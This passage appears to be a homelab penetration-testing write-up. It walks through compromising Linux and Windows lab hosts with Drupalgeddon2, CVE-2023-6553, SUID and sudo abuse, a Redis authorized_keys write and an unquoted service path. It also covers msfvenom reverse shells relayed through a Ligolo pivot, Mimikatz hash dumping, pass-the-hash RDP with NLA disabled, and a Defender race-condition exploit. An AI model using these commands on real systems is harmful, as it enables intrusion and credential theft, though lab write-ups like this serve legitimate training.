git clone https://github.com/Tuhinshubhra/CMSeeK
cd CMSeeK
pip install -r requirements.txt
python3 cmseek.py -h
```

<img width="1755" height="617" alt="image" src="https://github.com/user-attachments/assets/cd4c828b-6339-4b03-a49d-3e09c06e6bb6" />

Once it's done we can just run the tool : 

```bash
python3 cmseek.py -u 10.10.10.20
```

<img width="1024" height="810" alt="image" src="https://github.com/user-attachments/assets/46f29412-4110-4a28-ac0d-e2a3b162e62d" />

We get the version but not the exact version . Let's check via manual enumeration , usually if we can access the /ChangeLog , which is by default , we can find the exact version : 

```bash
curl -s http://10.10.10.20/CHANGELOG.txt | head -20
```

<img width="1069" height="644" alt="image" src="https://github.com/user-attachments/assets/ef1daa88-0971-44e0-a185-1751ff5a705c" />

Perfect the version is 7.57 , we can check online for vulnerabilities or some POC for exploits that targets this exact version , but before let's check Searchsploit : 

```bash
searchsploit Drupal 7.57
```

<img width="1849" height="488" alt="image" src="https://github.com/user-attachments/assets/274057fd-cdf2-4352-91d0-858c52c27c39" />

We find many RCE Exploits ,we need one that doesn't require Authentication , we will go with the Metasploit one since it is usually more stable , first we need to launch Metasploit : 

```bash
msfconsole
search drupal 7
use 1
```

<img width="1611" height="778" alt="image" src="https://github.com/user-attachments/assets/6b27613e-1059-4e2f-ab6e-41b421fdb392" />

We're using DrupalGeddon2 , let's check the parameters that we need to provide : 

<img width="1204" height="758" alt="image" src="https://github.com/user-attachments/assets/7e741866-1e4a-4465-847b-586210125eaa" />

It requires :

- LHOST : which is our listener , in this case our IP address .
- RHOSTS : The target IP Address
- RPORT : the target Port running the Drupal Service
- LPORT : The port we will be listenning on
- TARGET URI : Where the Drupal site is located , in this case it's the root directory /
- Exploit Target : we will keep the default one , which is PHP in memory , if this doesn't work , we can change it

```bash
set RHOSTS 10.10.10.20
run
```

<img width="1117" height="698" alt="image" src="https://github.com/user-attachments/assets/f069b5f3-ba1e-437b-b98d-1593ad25c8cd" />

We see that the exploit works , but we don't get any session .

This is because Ligolo lets us reach into the Internal Network , but it doesn't work the other way around , the Internal boxes can't reach our Kali machine directly , so when the payload tries to connect back to us it just fails . to fix that , we add a listener on the Ligolo Proxy , this makes the Pivot Box itself open port 4444 and forward anything that hits it straight back to our real listener on Kali . so instead of the target trying to reach Kali directly , which it can't , it connects to the Pivot Box instead , which is the one thing it actually can reach , and that's what relays it back to us .

Now back on our Ligolo Proxy server : 

```bash
 listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

- listener_add : tells the ligolo-ng proxy to create a new listener, but running on the agent (the pivot box), not on Kali
- addr 0.0.0.0:4444 : the address/port the listener opens on the pivot box itself, 0.0.0.0 means it listens on all of the pivot box's interfaces, so anything on the internal network that can reach the pivot box on port 4444 will hit this listener to .
- 127.0.0.1:4444 where the traffic gets forwarded once it arrives at Kali through the tunnel, 127.0.0.1 here refers to Kali's own loopback, since that's where your real msf handler is actually listening
- tcp : protocol for the listener, TCP in this case (matches your reverse_tcp payload

Now back to our exploit , we need to modify the LHOST to match the one of our Pivot Box , the LPORT will stay the same 4444 .

```bash
set LHOST 10.10.10.10
set LPORT 4444
run
```

<img width="1153" height="514" alt="image" src="https://github.com/user-attachments/assets/17135056-0fa0-4835-80a0-190525fe6269" />

We got our meterpreter session :)

If we wanted a shell , just type shell : 

```bash
shell
bash -i # Just to make it Somewhat interactive .
```

<img width="1215" height="396" alt="image" src="https://github.com/user-attachments/assets/27609534-c53e-4207-ae09-c4b52331e8fc" />

Now for privesc it's pretty easy to import tools using Meterpreter , we just  go back to our meterpreter session and upload or download specific files . 

You could import Linpeas and run it to find different ways to privesc . But in our case to save time , we will just do some manual Enumeration starting with the kernel version : 

```bash
uname -a
```

<img width="1414" height="446" alt="image" src="https://github.com/user-attachments/assets/a586bd38-ce8d-4b4d-83ac-dd2766a7f8da" />

We see that the kernel version is 6.17.0-23 , this one is pretty old , so it might be vulnerable to the recent Kernel exploits , we already tested CopyFail , let's check DirtyFrag : 

```bash
https://github.com/v4bel/dirtyfrag
```

We first Download the exploit , compile it on our Kali machine , then transfer it to the target box using our Meterpreter session . 

```bash
wget https://raw.githubusercontent.com/V4bel/dirtyfrag/refs/heads/master/exp.c
gcc exp.c -o exp
```

<img width="1602" height="738" alt="image" src="https://github.com/user-attachments/assets/bbd76c22-eee3-462e-8de5-497780a476e8" />

Now finally , we just transfer it using Meterpreter , back to our shell , we can go back to our Meterpreter session by either typing bg or CTRL+Z : 

<img width="1413" height="486" alt="image" src="https://github.com/user-attachments/assets/fa48d840-cefe-4feb-878a-f6590d5924f8" />

Now to navigate our Kali machine , we need to add l before the commands we usually run : 

```bash
pwd : this will show us the current location inside the target machine
lpwd : this will show us the location of our Kali machine instead .
cd : Navigate the target file system
lcd : Navigate the kali file system
ls : List files on the target
lls : List files locally 
```

<img width="988" height="752" alt="image" src="https://github.com/user-attachments/assets/e84bcba7-5aea-4db0-bf30-23719e5bb267" />

Now to import the exploit we use the meterpreter command upload : 

```bash
meterpreter> upload exp
```
<img width="1051" height="428" alt="image" src="https://github.com/user-attachments/assets/792b2450-eefa-41d3-8396-0c2061b31fa0" />

Once we import it , we make it executable and finally we run it : 

<img width="1198" height="478" alt="image" src="https://github.com/user-attachments/assets/06bfd4ee-0e8a-413a-926f-4dc6a6cafe39" />

We see that we get a Root Shell once our exploit is executed . 

Now we can move to the Third Box . 


### Backup : 

This one is the 10.10.10.30 : 

First we scan All ports , then we perfom a version and a script scan on the open ports .  

<img width="1346" height="806" alt="image" src="https://github.com/user-attachments/assets/82fd4af6-d8cb-4895-a5e8-2a30e7f3ef55" />

We don't get much , except the OS running . Both apache and SSH are up to date . 

Let's check the website : 

<img width="1319" height="667" alt="image" src="https://github.com/user-attachments/assets/b1865011-e7ff-446b-8e1c-59f660a377f8" />

This is just the default Apache webpage , let's attempt Brute Forcing directories : 

<img width="1515" height="752" alt="image" src="https://github.com/user-attachments/assets/307071ac-2cfb-44ae-8b49-58a4d269eb31" />

We find /wordpress . which means there is a WP site hosted on this box , we can use a tool like WPscan to enumerate this further since this is a WP site : 

```bash
wpscan --update # First update the DB
wpscan --url http://10.10.10.30/wordpress
```

<img width="1073" height="775" alt="image" src="https://github.com/user-attachments/assets/680c9008-5641-4525-829d-3b13c139e0f5" />

If we check the Pluggins : 

<img width="1230" height="550" alt="image" src="https://github.com/user-attachments/assets/975363c3-ba6b-4e2d-999d-82471f6e5377" />

Passive Method didn't identify any Pluggins . We can try aggressive method : 

```bash
wpscan --url http://10.10.10.30/wordpress -e vp --plugins-detection aggressive
```

but sadly , even with aggressive detection , it came back with nothing :

```bash
[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:14 (7343 / 7343) 100.00%
[i] No plugins Found.
```

7343 known locations checked and still nothing , which felt off for a box that's clearly built around a vulnerable plugin . the thing is , wpscan can only find what's in its bundled list , if the plugin's slug isn't in there , aggressive mode or not , it just won't see it . and no , an api key wouldn't help here either , that only pulls vulnerability data for plugins it already found , it doesn't help with detection .

So let's try brute forcing the plugins directory ourselves with ffuf and a seclists wordlist :

```bash
ffuf -u http://10.10.10.30/wordpress/wp-content/plugins/FUZZ/readme.txt -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -mc 200
```

<img width="1464" height="716" alt="image" src="https://github.com/user-attachments/assets/674ac6c3-acfc-4805-a088-7dafae05f98a" />

This caught the default plugins like akismet , so we know the technique works , but still no sign of our target plugin . turns out the slug just isn't in that wordlist either , same blind spot as wpscan. I also checked if directory listing was enabled on the plugins folder , since it was enabled on wp-content/uploads/ earlier :

```bash
curl -s http://10.10.10.30/wordpress/wp-content/plugins/
```

But that came back empty , so no easy win there .

At this point the automated tools have all struck out , so let's go fully manual . we already suspect the box is running the Backup Migration plugin , so instead of guessing slugs from a list , let's just hit its readme directly , every wordpress plugin ships a readme.txt at a predictable path with the version baked in :

```bash
curl http://10.10.10.30/wordpress/wp-content/plugins/backup-backup/readme.txt
```

And there it is :

<img width="1401" height="664" alt="image" src="https://github.com/user-attachments/assets/b2d0599a-ef6d-427b-81c9-3689f2ac0b82" />

Perfect , that confirms it , Backup Migration version 1.3.7 . the folder is backup-backup even though the plugin's display name is "Backup Migration" , which is exactly why the wordlists missed it . 

Looking online we find that 1.3.7 is vulnerable to CVE-2023-6553 , an unauthenticated RCE , which is our way in .

<img width="977" height="812" alt="image" src="https://github.com/user-attachments/assets/5ba72314-cca7-4be8-ad61-f1d3bafd2f3e" />

There is a Metasploit Module as well that we can use : 

```bash
msfconsole
use multi/http/wp_backup_migration_php_filter
```

<img width="1486" height="816" alt="image" src="https://github.com/user-attachments/assets/7e5b757d-76a5-43c3-a140-b0fc5faeb35d" />

First close the first session we got on port 4444 , or create a new listener for this new exploit : 

<img width="1293" height="832" alt="image" src="https://github.com/user-attachments/assets/43d01235-2270-4a6c-9935-ca2c31737cac" />

We need to specify the RHOSTS, RPORT, LHOST, LPORT, and TargetURI . 

- LHOST will again be the Pivot Box IP address .
- LPORT will be 4444 as well since that's the listener we specified .
- TargetURI will be /wordpress since it's not in the root folder this time.

```bash
set RHOSTS 10.10.10.30
set LHOST 10.10.10.10
set TARGETURI /wordpress
run
```

<img width="1325" height="641" alt="image" src="https://github.com/user-attachments/assets/e5409428-687d-4b07-a0bf-963bb060bb49" />

Now we have Initial access , for privesc , we can try manual exploiation first : 

```bash
id : Check for Groups and Which user . 
cat /etc/passwd : Check other users on the machine . 
sudo -l : which prog can be ran with root perm . 
uname -sr / lsb_relase -a : Version + architecture .  
find / -type f -perm -04000 -ls 2>/dev/null : Find binaries with SUID . 
Check for Bash History .
```

A detailed section on Linux privesc if you wanted to try them on these boxes : 

```bash
https://elmehdilaassiri.github.io/posts/oscp-cpts-methodology/#linux-priv-escalation-
```

If we check the SUIDs : 

<img width="1302" height="833" alt="image" src="https://github.com/user-attachments/assets/e6683456-74a3-4f53-aada-607b008fdc01" />

We find a binary that isn't default one , /usr/bin find , this was going to get caught by Linpeas as well . 

Now can check GTFOBINS to see if there are ways to abuse this SUID binary to get Root : 

```bash
https://gtfobins.org/
```

<img width="1414" height="864" alt="image" src="https://github.com/user-attachments/assets/366dd58f-063e-48f6-94e5-b76a5fed7c35" />

We see that it is one of the vulnerable binaries : 

Looking at the doc , to get root Shell we just execute : 

```bash
find . -exec /bin/sh -p \; -quit
```

<img width="1404" height="747" alt="image" src="https://github.com/user-attachments/assets/95eb8be3-62be-4ae7-b2b6-a661af09571b" />

Perfect we got our Root access . 

Now let's move to the other boxes .


### ORNN : 

Checking the nmap scan from earlier , the ORNN machine is the host with this IP address : 10.10.10.40 as we can see from the open ports . 

<img width="1283" height="833" alt="image" src="https://github.com/user-attachments/assets/ee29cb17-39f8-4040-a9e1-44aa5641a278" />

We find many ports opened , the interesting ones are NFS,SMB and RPC .

We'll scan for versions as well as default vuln scripts for these open ports :

```bash
nmap -p445,2049,139,111 10.10.10.40 -sVC
```

<img width="1010" height="818" alt="image" src="https://github.com/user-attachments/assets/7b356abd-0990-48b7-8412-ee33270d0235" />

Looking at the version , we find SAMBA 3.0 , and from the nmap script , we find some general information like the hostname :

<img width="1179" height="662" alt="image" src="https://github.com/user-attachments/assets/23d620dd-4c3e-4fd7-8bb7-2d99ff26fd98" />

Now let's deeply enumerate each port :


#### NFS : 

First let's see if we can mount the NFS server on our kali machine without authentication .

First let's try to list the shares that are available to us without authentication : 

```bash
showmount -e 10.10.10.40
```

<img width="891" height="247" alt="image" src="https://github.com/user-attachments/assets/d6a36c00-a0f7-4a94-8138-b89ab765aad9" />

We get : 

```bash
/srv/share *
```

This means anything inside this share is available for everyone in the network to access . Now to mount this onto our Kali host :

```bash
mkdir nfs
sudo mount -t nfs -o vers=3,nolock 10.10.10.40:/srv/share ~/HomeLab/nfs
```

<img width="1297" height="687" alt="image" src="https://github.com/user-attachments/assets/0f91d9a1-9f31-4f9f-9b20-88c92daae4a0" />

Version 2 wasn't supported so we tried V3 . 

Now finally let's unzip this file :

<img width="1328" height="542" alt="image" src="https://github.com/user-attachments/assets/70814eda-fb1d-4edd-9ae4-ad116af52a83" />

This requires a Passphrase which we don't have , we can try cracking it using John , first we transform it into a file format that John can crack using zip2john : 

```bash
zip2john nfs/windows-creds.zip > forjohn
john --wordlist=/usr/share/wordlists/rockyou.txt  forjohn 
```

<img width="1796" height="590" alt="image" src="https://github.com/user-attachments/assets/790dee13-dbf9-49ca-96cb-c72a36593f68" />

We are able to crack it using rockyou wordlist . Now we just unzip everything :

<img width="1217" height="766" alt="image" src="https://github.com/user-attachments/assets/4e4fd8f5-789a-4a4a-9a43-e54724b76963" />

If we access the Credentials folder we get a list of usernames and passwords that we can spray on the rest of the Boxes . 

<img width="1280" height="752" alt="image" src="https://github.com/user-attachments/assets/044a2e05-d91f-42c7-a3da-82c3af323181" />

Now that we've got some creds , we can test them for SSH access on ORNN first . 

<img width="1292" height="564" alt="image" src="https://github.com/user-attachments/assets/88d2d91f-6dba-425a-9881-9264f2fe0ad6" />

We see that we can Login via SSH . 

for Privesc , we can import Linpeas, but in order to save time , the vulnerability is in the sudo binary permissions : 

<img width="1394" height="458" alt="image" src="https://github.com/user-attachments/assets/4457d060-fa02-4296-8a6f-a94f4e48eb34" />

We see that our user is able to execute the nano Binary as root , without needing password . 

We can check GTFOBINS , to see if there are ways we can abuse this : 

```bash
https://gtfobins.org/gtfobins/nano/
```

<img width="1335" height="824" alt="image" src="https://github.com/user-attachments/assets/3c0c4bf0-034a-4597-a20e-1473a5afc066" />

We see that there is a way we can get Root access : 

- First Open a Terminal as root .
- Press Ctrl+R (Read File), then Ctrl+X (Execute Command)
- At the Command to execute: prompt, type:

```bash  
reset; sh 1>&0 2>&0
```

<img width="1104" height="857" alt="image" src="https://github.com/user-attachments/assets/c74d00cf-b3cd-40a3-b323-ec521b31ca7a" />

Now if we execute it : 

<img width="1432" height="694" alt="image" src="https://github.com/user-attachments/assets/c811c06b-f2a8-44d6-860f-21f6916b78d6" />

We see that we got our Root Access by abusing the nano binary . 

Now let's check the other ways we can get Root on this box : 


#### Samba : 

Looking at the scan result , we see that the host is running SAMBA 3.0 , if we check searchsploit for known Vulnerabilities : 

```bash
searchsploit samba 3.0
```

<img width="1903" height="500" alt="image" src="https://github.com/user-attachments/assets/dfb9b649-a653-4da4-a3c1-8f7f57ddc4c3" />

We find that there is a module in Metasploit for this version that will grant us RCE . 

```bash
msfconsole
search samba 3.0
```

<img width="1680" height="750" alt="image" src="https://github.com/user-attachments/assets/9abcd1e5-26b0-48f0-ad4e-34d71f36e9ee" />

We will use the first one : 

<img width="1295" height="841" alt="image" src="https://github.com/user-attachments/assets/06f2bd2c-96d0-43e8-9678-829621e63228" />

For the options , it needs the RHOSTS , LHOST which will be our Pivot IP , and for the LPORT , we will use a new one , first we need to create a new listener using Ligolo : 

```bash
listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:5555 --tcp
```

<img width="1028" height="286" alt="image" src="https://github.com/user-attachments/assets/840b2137-f391-46b1-b3aa-6ed442087ff7" />

Now back to our exploit , we specify the new LPORT , and the Pivot IP address : 

```bash
set LHOST 10.10.10.10
set LPORT 5555
set RHOSTS 10.10.10.40
```

<img width="1212" height="667" alt="image" src="https://github.com/user-attachments/assets/5d269a5f-abb3-41f6-8f2b-33ff78088cec" />

The exploit will grant us immediate Root access . 

Now moving on to the Redis server : 



#### Redis : 

First let's try if we can access the Redis server : 

<img width="742" height="292" alt="image" src="https://github.com/user-attachments/assets/b2af61fe-af19-42b0-851d-c9f1c1dc7a2e" />

If we get PONG this means Redis server is reachable . 

<img width="1099" height="888" alt="image" src="https://github.com/user-attachments/assets/95394d2a-c2e9-43e5-95d0-6c5db55ce79b" />

We can also pull more info about the server with redis-cli , this leaks the Redis version, OS, and process info, and config get dir shows us the directory Redis is writing to.

```bash
redis-cli -h 10.10.10.40 info server
redis-cli -h 10.10.10.40 config get dir
```

Since we know the directories Redis is writing to , and since Redis is reachable , and doesn't require auth by default , we can write into the same directory Redis is writing to , let's write our SSH key into that machine , and login via SSH . 

First, we generate the keys , the public key will be the one we put inside the Target and the private one is the one we use to login . 

```bash
ssh-keygen -t rsa -b 4096 -f redis_key -N ""
```

<img width="1121" height="783" alt="image" src="https://github.com/user-attachments/assets/5e535c8d-c0c5-4fe4-900b-e6ffcb549b05" />

This gives us redis_key (private) and redis_key.pub (public) , the pub key is the one we're going to smuggle into the target .

now the trick with old Redis and CONFIG SET is that we can point dir and dbfilename anywhere we want , then SAVE writes whatever's in the DB straight to that file as raw text . if we control the value we write to a key , and the value looks enough like a valid authorized_keys line , the dump ends up being a working file .

first we set the path :

```bash
redis-cli -h 10.10.10.40 config set dir /home/azerty/.ssh/
redis-cli -h 10.10.10.40 config get dir
```

<img width="972" height="484" alt="image" src="https://github.com/user-attachments/assets/ec4bcc05-56b3-4005-8cef-5df297ab87e4" />

This should return /home/azerty/.ssh/ , confirming Redis is happy to write there , this only worked because we already created that folder with the right ownership and 700 perms earlier , otherwise Redis running as its own low priv user wouldn't be able to write into it .

Then we set the filename :

```bash
redis-cli -h 10.10.10.40 config set dbfilename "authorized_keys"
```

Now we need to actually get our key into the DB , we pad it with newlines so it lands cleanly on its own line inside the dump , then set it as a value :

```bash
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") | redis-cli -h 10.10.10.40 -x set sshkey
```

Then we just force a save :

```bash
redis-cli -h 10.10.10.40 save
```

<img width="1442" height="710" alt="image" src="https://github.com/user-attachments/assets/b6829650-2912-496a-80a9-659ce62a3949" />

if that comes back OK , Redis just wrote our pubkey out to /home/azerty/.ssh/authorized_keys .

last step , we ssh in with the matching private key :

```bash
ssh -i redis_key azerty@10.10.10.40
```

<img width="1252" height="689" alt="image" src="https://github.com/user-attachments/assets/7362cb0c-6483-4fe2-bb57-b883e6a70fbf" />

We are able to login via SSH, as the azerty user , since it was the user we setup the entire scenario with he already had NOPASS ALL which means he can run any binary as the Root user without needing a password .

In this case we chose to run the su binary to get Root : 

```bash
sudo su
```

<img width="1226" height="610" alt="image" src="https://github.com/user-attachments/assets/e17aa8ff-5901-44b4-9512-bf8c3356a883" />

We manage to get Root with 3 different Paths for this machine . 

Now let's move the Rogue machine . 


### Rogue : 


Now back to our nmap scan we found 2 Windows Boxes , 1 was the DC and the second one was a Windows Workstation . 

<img width="899" height="378" alt="image" src="https://github.com/user-attachments/assets/c30305b3-3c6d-4c4c-9334-f04b18303b04" />

Scanning all ports , we find 3 : Winrm , RDP , and panda-pub .

<img width="1216" height="783" alt="image" src="https://github.com/user-attachments/assets/04809f9b-137e-463d-b942-e820554da972" />

Version scanning and default scripts didn't return anything useful . 

We already have these creds from the NFS server : 

```bash
svc_backup : Backup@123
```

Let's test them to see if we can login via Winrm , or RDP . 

```bash
nxc rdp 10.10.10.50 -u svc_backup -p 'Backup@123' --local-auth
nxc winrm 10.10.10.50 -u svc_backup -p 'Backup@123' --local-auth
```

<img width="1436" height="452" alt="image" src="https://github.com/user-attachments/assets/b187b90c-8f13-426b-bf92-dddd505c5732" />

Our user can login via Winrm but can't RDP to the machine , let's connect via Winrm :

```bash
evil-winrm -i 10.10.10.50 -u svc_backup -p "Backup@123"
```

<img width="1472" height="580" alt="image" src="https://github.com/user-attachments/assets/cb5e4e6b-0f6f-430a-b268-9d150cf39ca1" />

Now that we got access , let's import some tools to help us find the privesc vector , before importing Winpeas , we can do a quick check using PowerUp.ps1 . 

```bash
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
```

Importing Tools is pretty simple using Evil-winrm , we just use the upload function : 

<img width="1627" height="819" alt="image" src="https://github.com/user-attachments/assets/bbfff7f4-9db5-4a86-853f-e1a3e654cc7b" />

Just make sure you specify the correct path . 

<img width="1660" height="831" alt="image" src="https://github.com/user-attachments/assets/713a2c52-3601-4234-aab2-d546583b55dc" />

If the size doesn't match you can zip it , transfer it to the Pivot Box then from there import it to the Windows box . 

Now that we uploaded PowerUP , we can first bypass the execution policy otherwise we will get an error since we can't run Scripts : 

<img width="1687" height="565" alt="image" src="https://github.com/user-attachments/assets/90acfeb1-cd56-4f8c-a7f8-80391538c64c" />

```bash
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
. .\PowerUp.ps1   # Import the module 
Invoke-Allchecks  # Run the checks 
```

<img width="1128" height="782" alt="image" src="https://github.com/user-attachments/assets/0d253df4-283f-4aaf-a29a-8c2328caa81c" />

I tried both Winpeas and PowerUp but they didn't find the Unquoted Service Path , so we will do it manually , first let's list all Services and check for interesting ones : 

```powershell
Get-Service
```

<img width="924" height="620" alt="image" src="https://github.com/user-attachments/assets/3bef86ef-96ad-4b63-918c-ca5fc24c874f" />

We find an unusual one , BackupService , let's enumerate it further using sc : 

```powershell
sc.exe query BackupService
sc.exe qc BackupService
```

<img width="1174" height="655" alt="image" src="https://github.com/user-attachments/assets/b367e9fa-93ff-42d4-8092-a04bd90bdc73" />

Found it , Unquoted service path , and it is running as System . 

As long as we have write access to C:\Program Files\, we can drop a malicious Backup.exe there directly. Because Windows checks each space-delimited segment of the unquoted path in order, it finds and executes our C:\Program Files\Backup.exe before ever reaching the intended C:\Program Files\Backup Service\backup.exe. Since the service runs as SYSTEM, our binary which will be a reverse shell will be executed with SYSTEM privileges.

First let's check if we have access to write into this folder : 

```powershell
icacls "C:\Program Files"
```

<img width="1263" height="585" alt="image" src="https://github.com/user-attachments/assets/256f579f-18f3-4e6d-80bb-5908d8a424ec" />

Perfect , we have Modify (M) writes over the entire Directory . 

Now on our Kali machine let's generate our Reverse shell , then setup a listener . 

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=7777 -f exe -o Backup.exe
```

For the LHOST , we're using the Pivot Box to catch the session , but different port this time , we will open it via Ligolo later . 

Once generated , we transfer it to the target machine using our Winrm session : 

<img width="1920" height="693" alt="image" src="https://github.com/user-attachments/assets/ec6cae13-8dd1-4c82-b74b-6e04b7af2194" />

Then we set up our Listener , we will use multi handler for this one .

For the LHOST we will open a new Listener , on port 7777 using Ligolo .

```bash
 listener_add --addr 0.0.0.0:7777 --to 127.0.0.1:7777 --tcp
```

<img width="1473" height="425" alt="image" src="https://github.com/user-attachments/assets/3c64230b-ee96-4bb0-acc5-7e4877ac2edd" />

Now we just set up the multi handler , for the LHOST we will use the Pivor box IP like we did before and the payload as windows/x64/shell_reverse_tcp just like we specified when creating the reverse shell . 

```bash
msf > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.10.10
LHOST => 10.10.10.10
msf exploit(multi/handler) > set LPORT 7777
LPORT => 7777
msf exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf exploit(multi/handler) > run
```

Now we just move the new Backup.exe to the Program Files directory , from there we restart the service and it should execute the reverse shell . 

<img width="1890" height="860" alt="image" src="https://github.com/user-attachments/assets/680b0f0f-d36d-4f27-8e89-72d63e6cfa3a" />

We see that we are now System . 

**Other Path :**

Now there is another way to get System , we need to RDP to the box to be able to run the Rogue Planet exploit which will give us SYSTEM as well . 

First let's import Mimikatz , dump hashes , get the admin hash and login via RDP . 

To make life easier when it comes to importing our tools we will upgrade our shell to a mterpreter shell , we can use this module : 

```bash
use multi/manage/shell_to_meterpreter
```

First we run CTRL Z to background our shell , use this post exploitation module , it takes as a parameter the Session we have earlier , then we run it : 

<img width="1290" height="673" alt="image" src="https://github.com/user-attachments/assets/6f23e20e-0c60-49e0-bdef-d087c0b245dc" />

It should fail at first , since we're using a Ligolo proxy there are few things we need to change . 

First we need to created a new listener , we will use 4443 since this is what the module uses by default : 

```bash
listener_add --addr 0.0.0.0:4433 --to 127.0.0.1:4433 --tcp
```

<img width="1433" height="502" alt="image" src="https://github.com/user-attachments/assets/686ed447-055e-42c0-bf51-c5281d20c957" />

Then for the LHOST we should specify the one of our Pivot Host : 

```bash
set SESSION 1
set LHOST 10.10.10.10
run
```

<img width="1470" height="813" alt="image" src="https://github.com/user-attachments/assets/19765792-c9bf-4281-9ebe-e29b57740eb9" />


Perfect we got our Meterpreter session , to interact with it , we just type : 


```bash
sessions -i 2
```

<img width="1437" height="553" alt="image" src="https://github.com/user-attachments/assets/77853941-bb48-4ad2-b240-9717c1416a68" />

We just navigate to the directory where we're hosting our tools : 

<img width="1426" height="351" alt="image" src="https://github.com/user-attachments/assets/d8e3c602-1ca0-4e0b-9916-d472a58c7353" />

We just import it now using our meterpreter session 

- If you don't want to use Meterpreter , you can manually import them to the Pivor box then from there we transfer it to the windows box .
- Or just create a reverse shell with a Meterpreter shell from the beguinning , but in this case i just wanted to test if it will work so i didn't want to risk using a meterpreter one . 

<img width="1357" height="548" alt="image" src="https://github.com/user-attachments/assets/c4faa5bd-f521-4f5c-bff4-cdee1225de5d" />

Once inside Mimikatz : 

```bash
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

<img width="1202" height="638" alt="image" src="https://github.com/user-attachments/assets/ae321004-41a4-4c6b-8916-20c06f67dcf2" />

We got the NTLM hash of the elmehdi user that we will use to RDP to the machine , let's verify if this user can RDP : 

```bash
nxc rdp 10.10.10.50 -u elmehdi -H c22b315c040ae6e0efee3518d830362b
```

<img width="1490" height="374" alt="image" src="https://github.com/user-attachments/assets/bd6c4126-d148-4b63-9f84-07651bce4c90" />

We see the pwn3d! which means this user can login via RDP .

So now all we need to do is RDP to the machine , import our exploit , run it and it should give us System . 

```bash
xfreerdp3 /v:10.10.10.50 /u:elmehdi /pth:c22b315c040ae6e0efee3518d830362b /cert:ignore +clipboard /dynamic-resolution /drive:SHARED,.
```

Here we're using the Hash to login via RDP , the /drive is to have a shared drive between our Kali machine and the target machine , to easily import our Tools : 

<img width="1609" height="619" alt="image" src="https://github.com/user-attachments/assets/4fa33650-de35-4e93-8619-144dd8b72658" />

This won't work, since elmehdi is part of the local Admin group , so we can't just login using pth via RDP . 

To enable PTH for Administrators on the machine we need to modify it using the registry :

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

We already has System so we will be able to execute this , or just Login to Rogue normally and modify it so that you can proceed with the attack . 

We also need to disable NLA : 

NLA (Network Level Authentication) is blocking PTH for non-RID-500 accounts at the RDP layer specifically, which is separate from the UAC token filtering :

```bash
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0

# Then to verify :
Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication"
```

<img width="1211" height="401" alt="image" src="https://github.com/user-attachments/assets/55689713-3443-4f64-ada3-ea6205a5cc33" />

If the RDP using PTH doesn't work, just login normally , Download the Exploit on you Kali machine , transfer it to the Pivot Box and from there , Import it to the Rogue machine . (Or you could create a new listner on Ligolo that will forward traffic from port 80 on the Pivot box back to our local port 80 , and from there we use wget and specify the IP address of the Pivot box instead of ours ) 

Let's try it quickly , instead of port 80 let's use 8888 , first create the listener on our Ligolo server :

```bash
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888 --tcp
```

<img width="1556" height="734" alt="image" src="https://github.com/user-attachments/assets/43e7fb59-44df-46f9-a22d-647637358f57" />

Then we Download the Exploit : 

```bash
https://github.com/MSNightmare/RoguePlanet
git clone https://github.com/MSNightmare/RoguePlanet.git
```

<img width="1111" height="694" alt="image" src="https://github.com/user-attachments/assets/457910e4-d0e9-416c-8b77-76a6eb438bc0" />

Now we just setup our Python Server , on port 8888 :

```bash
python3 -m http.server 8888
```

Finally on the Rogue machine , we use IWR or Wget but we specify the IP address of our Pivot Box not our Kali IP , and it will be forwarded automatically using Ligolo : 

```bash
wget http://10.10.10.10:8888/RoguePlanet.exe -o Rogue.exe
```

<img width="1259" height="641" alt="image" src="https://github.com/user-attachments/assets/c5396f2c-5b4f-4b91-8c31-f8c88e7fc347" />

Now back on our Python Server , we see that we got a callback and we get a 200 which means the executable was transfered successfully . 

<img width="1106" height="453" alt="image" src="https://github.com/user-attachments/assets/190c1130-5bfe-4cde-a978-2a6e412bccbd" />

Now finally we just Run the Exploit and Hope we get System : 

<img width="1212" height="673" alt="image" src="https://github.com/user-attachments/assets/7f2f2931-a73d-449f-8053-52b1696d26c2" />

Note that this is a Race Condition Vulnerability which means it might not always work , i got it to work twice, and it was same day when it came out , from there it didn't work for me :)

The exploit abuses a timing window between file creation and Windows Defender's processing of that file, so the window can open and close without you catching it depending on system load, timing, and luck. I got it to work on the same day the exploit dropped; since then it's been hit or miss.

At the time of writing, there is still no official patch for this vulnerability. It will likely be addressed in an upcoming Patch Tuesday, so by the time you're reading this, the exploit may no longer work on a fully patched system — which is also why it makes sense as a lab scenario: it documents a real, working 0-day at the time this lab was built, even if its shelf life is limited.``


### DC01 / CA01 : 

First we start by scanning both : 

```bash
nmap 10.10.10.100 10.10.10.101
```

<img width="1134" height="832" alt="image" src="https://github.com/user-attachments/assets/fdd0380e-0bc9-4d06-abe2-cc91d8e1a752" />

Looking at the scan result , we can tell that 10.10.10.100 is the DC , from having LDAP, Kerberos and DNS . 

First thing we should do is add the Domain name as well as the hostnames to our /etc/hosts file . we can use nxc to generate the hostfile : 

```bash
nxc smb targets --generate-hosts-file hosts
```

<img width="1849" height="581" alt="image" src="https://github.com/user-attachments/assets/f8650756-9325-4bcf-b9d3-6bc2b513f641" />

Now we just add those lines to our hosts file : 

<img width="1103" height="639" alt="image" src="https://github.com/user-attachments/assets/908dc20e-f0a7-414b-b006-d137023f24cc" />

